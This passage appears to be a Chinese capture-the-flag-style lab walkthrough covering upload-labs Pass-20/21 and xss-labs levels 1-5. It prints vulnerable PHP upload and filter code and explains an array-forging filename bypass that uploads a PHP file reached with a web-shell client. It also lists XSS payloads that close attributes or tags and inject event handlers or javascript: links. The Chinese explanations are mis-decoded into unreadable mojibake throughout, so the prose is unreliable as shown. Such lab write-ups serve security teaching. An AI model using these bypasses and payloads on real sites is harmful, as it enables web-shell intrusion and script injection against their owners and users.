class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955415.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955515.png"></p><h3 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//æ£€æŸ¥MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//æ£€æŸ¥æ–‡ä»¶å</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¼ å…¥çš„å†…å®¹æ˜¯æ•°ç»„ï¼Œé‚£ä»–ä¸ä¼šè¿›è¡Œæ£€æŸ¥ï¼ŒåŒæ—¶æŠŠæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ å’Œæœ€åä¸€ä¸ªå…ƒç´ é€šè¿‡ç‚¹æ‹¼æ¥æˆä¸€ä¸ªå®Œæ•´çš„æ–‡ä»¶åã€‚</p><p>å¦‚æœä¼ å…¥çš„å†…å®¹ä¸æ˜¯æ•°ç»„ï¼Œä»–ä¼šä»¥ç‚¹ä¸ºåˆ†å‰²ï¼ŒæŠŠåå­—å’Œåç¼€åˆ†å¼€ï¼Œå½¢æˆä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºæ–‡ä»¶åå­—ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºåç¼€åï¼Œå†æ¥ç€ï¼Œå®ƒä¼šå¯¹ä½ æ•°ç»„ä¸­æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªå…ƒç´ åç¼€åï¼‰è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸ç¬¦åˆç™½åå•ä¸Šçš„å†…å®¹ï¼Œé‚£å°±ç›´æ¥ç¦æ­¢äº†ï¼Œå¦‚æœå…è®¸ï¼Œä»–ä¼šè®©æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸æœ€åä¸€ä¸ªå…ƒç´ é€šè¿‡ç‚¹æ¥ç»“åˆï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„æ–‡ä»¶åã€‚</p><p>ä¸€åˆ‡çš„æ ¹æºéƒ½æ˜¯ä¿å­˜çš„åç§°æ˜¯ä¸æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ªé€ ä¸€ä¸ªæ•°ç»„</p><p>é¦–å…ˆä¸Šä¼ phpæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955560.png"></p><p>ä¿®æ”¹è¿™ä¸€æ®µ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955963.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955255.png"></p><p>æ›´æ”¹å®Œä¹‹åæ”¾åŒ…ï¼Œä¸Šä¼ æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955086.png"></p><p>ä½¿ç”¨èšå‰‘é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955778.png"></p><h1 id="2ã€xss-labs"><a href="#2ã€xss-labs" class="headerlink" title="2ã€xss-labs"></a>2ã€xss-labs</h1><p>XSS çš„æ ¸å¿ƒåŸç†æ˜¯ <strong>æ”»å‡»è€…é€šè¿‡è¾“å…¥æ¶æ„è„šæœ¬ï¼Œåˆ©ç”¨ç½‘ç«™æœªè¿‡æ»¤çš„æ¼æ´ï¼Œè®©æµè§ˆå™¨æ‰§è¡Œè¿™äº›è„šæœ¬ï¼Œä»è€Œå®æ–½æ”»å‡»</strong>ã€‚</p><h4 id="level1-ç›´æ¥æ³¨å…¥"><a href="#level1-ç›´æ¥æ³¨å…¥" class="headerlink" title="level1_ç›´æ¥æ³¨å…¥"></a>level1_ç›´æ¥æ³¨å…¥</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955481.png"></p><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956284.png"></p><p>å½“è°ƒç”¨ <code>alert()</code> æ—¶ï¼Œå®é™…ä¸Šä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ol><li>å¼¹å‡ºä¸€ä¸ªç¡®è®¤å¯¹è¯æ¡†ï¼Œæ˜¾ç¤ºæ¶ˆæ¯â€œå®Œæˆçš„ä¸é”™ï¼â€ã€‚</li><li>ç”¨æˆ·ç‚¹å‡»ç¡®è®¤åï¼Œé¡µé¢ä¼šé‡å®šå‘åˆ° <code>level2.php</code>ï¼Œå¹¶ä¸”ä¼ é€’ä¸€ä¸ªæŸ¥è¯¢å‚æ•° <code>keyword=test</code>ã€‚</li></ol><p>ç›´æ¥åœ¨åœ°å€æ è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">name=&lt;script&gt;alert()&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956277.png"></p><h4 id="level2-â€-é—­åˆç»•è¿‡"><a href="#level2-â€-é—­åˆç»•è¿‡" class="headerlink" title="level2_â€&gt;é—­åˆç»•è¿‡"></a>level2_â€&gt;é—­åˆç»•è¿‡</h4><p>å…ˆæ’å…¥jså°è¯•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956109.png"></p><p>è¿™é‡Œå±äºç‰¹æ®Šç¬¦å·è¢«å®ä½“è½¬ä¹‰ï¼Œæ‰€ä»¥<code>&lt;script&gt;alert()&lt;/script&gt;</code>æ²¡æœ‰è¢«å®ä½“è½¬ç§»</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956812.png"></p><p>å¯ä»¥çœ‹åˆ°<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>è¢«åµŒå¥—åˆ°valueå±æ€§ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é—­åˆinputæ ‡ç­¾ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">payloadï¼š<br>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957776.png"></p><h4 id="level3-onfocuså’ŒÎ¿nclick"><a href="#level3-onfocuså’ŒÎ¿nclick" class="headerlink" title="level3_onfocuså’ŒÎ¿nclick"></a>level3_onfocuså’ŒÎ¿nclick</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ¬¢è¿æ¥åˆ°level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ¬¢è¿æ¥åˆ°level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ²¡æœ‰æ‰¾åˆ°å’Œç›¸å…³çš„ç»“æœ.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">æœç´¢</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payloadçš„é•¿åº¦:0<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>å°è¯•é—­åˆå•å¼•å·</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957476.png"></p><p>æŸ¥çœ‹æºä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957990.png"></p><p><code>htmlspecialchars()</code> æ˜¯ PHP ä¸­ç”¨äºå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“çš„æ ¸å¿ƒå®‰å…¨å‡½æ•°ï¼Œä¸»è¦ç”¨äºé˜²æ­¢ XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰å¹¶ç¡®ä¿å†…å®¹åœ¨ HTML ä¸­æ­£ç¡®æ˜¾ç¤ºã€‚</p><hr><table><thead><tr><th align="center">åŸå­—ç¬¦</th><th align="center">æ­£ç¡®è½¬æ¢åçš„ HTML å®ä½“</th><th align="center">è§¦å‘æ¡ä»¶</th></tr></thead><tbody><tr><td align="center"><code>&amp;</code></td><td align="center"><code>&amp;</code></td><td align="center"><strong>å§‹ç»ˆè½¬æ¢</strong></td></tr><tr><td align="center"><code>&quot;</code></td><td align="center"><code>&quot;</code></td><td align="center">é»˜è®¤ï¼ˆ<code>ENT_COMPAT</code>ï¼‰æˆ– <code>ENT_QUOTES</code></td></tr><tr><td align="center"><code>&#39;</code></td><td align="center"><code>&#39;</code>ï¼ˆæˆ– <code>&#39;</code>*ï¼‰</td><td align="center"><strong>ä»…å½“è®¾ç½® <strong><code>ENT_QUOTES</code></strong> æ—¶</strong></td></tr><tr><td align="center"><code>&lt;</code></td><td align="center"><code>&lt;</code></td><td align="center"><strong>å§‹ç»ˆè½¬æ¢</strong></td></tr><tr><td align="center"><code>&gt;</code></td><td align="center"><code>&gt;</code></td><td align="center"><strong>å§‹ç»ˆè½¬æ¢</strong></td></tr></tbody></table><p>ä½¿ç”¨ htmlspecialchars å‡½æ•°å¯¹ $str è¿›è¡Œè½¬ä¹‰</p><p>åˆ©ç”¨onfocusäº‹ä»¶ç»•è¿‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27; onfocus=javascript:alert()â€˜</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957196.png"></p><p>åˆ©ç”¨onclickäº‹ä»¶ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27; Î¿nclick=&#x27;javascript:alert()&#x27;<br></code></pre></td></tr></table></figure><h4 id="level4-onfocuså’ŒÎ¿nclick"><a href="#level4-onfocuså’ŒÎ¿nclick" class="headerlink" title="level4_onfocuså’ŒÎ¿nclick"></a>level4_onfocuså’ŒÎ¿nclick</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&quot; onfocus=javascript:alert() &quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957997.png"></p><h4 id="level5-a-hrefæ ‡ç­¾æ³•"><a href="#level5-a-hrefæ ‡ç­¾æ³•" class="headerlink" title="level5_a hrefæ ‡ç­¾æ³•"></a>level5_<strong>a hrefæ ‡ç­¾æ³•</strong></h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957242.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958585.png"></p><p>åˆ†ææºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;<br><br><span class="hljs-meta">&lt;?php</span> <br></code></pre></td></tr></table></figure><ul><li>strtolower()å‡½æ•°ç”¨äºå°†å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å¤§å†™å­—æ¯è½¬æ¢ä¸ºå°å†™å­—æ¯ã€‚éå­—æ¯å­—ç¬¦ï¼ˆå¦‚æ•°å­—ã€ç¬¦å·ã€ä¸­æ–‡ç­‰ï¼‰ä¸å—å½±å“ã€‚</li><li>str_replace()å‡½æ•°ï¼Œç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾å¹¶æ›¿æ¢æŒ‡å®šçš„å†…å®¹ã€‚</li></ul><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<strong>a hrefæ ‡ç­¾æ³•</strong></p><p><a href="https://www.w3school.com.cn/tags/index.asp">HTML æ ‡ç­¾å‚è€ƒæ‰‹å†Œ</a></p><p>å…³äº HTML ä¸­ <code>&lt;a&gt;</code> æ ‡ç­¾ï¼ˆè¶…é“¾æ¥ï¼‰çš„ <code>href</code> å±æ€§ç”¨æ³•ï¼š<a href="https://www.w3school.com.cn/tags/tag_a.asp">HTML  æ ‡ç­¾_</a></p><p><code>href</code>å±æ€§çš„æ„æ€æ˜¯ï¼šå½“æ ‡ç­¾<code>&lt;a&gt;</code>è¢«ç‚¹å‡»çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘æ‰§è¡Œè·³è½¬ï¼Œè·³è½¬åˆ°ä¸€ä¸ªç½‘ç«™ï¼Œè¿˜å¯ä»¥è§¦å‘æ‰§è¡Œä¸€æ®µjsä»£ç ã€‚</p><p><strong>åŸºç¡€è¯­æ³•</strong></p><p><code>&lt;a&gt;</code>Â æ ‡ç­¾é€šè¿‡Â <code>href</code>Â å±æ€§å®šä¹‰é“¾æ¥ç›®æ ‡ï¼ŒåŸºæœ¬æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;ç›®æ ‡åœ°å€&quot;</span>&gt;</span>é“¾æ¥æ–‡æœ¬æˆ–å…ƒç´ <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li><strong>ç‚¹å‡»å…ƒç´ </strong>ï¼šå¯ä»¥æ˜¯æ–‡æœ¬ã€å›¾ç‰‡æˆ–å…¶ä»– HTML å†…å®¹ã€‚</li><li><strong>è¡Œä¸º</strong>ï¼šç‚¹å‡»åé»˜è®¤åœ¨å½“å‰é¡µé¢è·³è½¬ï¼ˆå¯é€šè¿‡ <code>target</code> å±æ€§æ§åˆ¶ï¼‰ã€‚</li></ul><p>æ·»åŠ ä¸€ä¸ªæ ‡ç­¾å¾—é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œæ„å»ºpayloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> 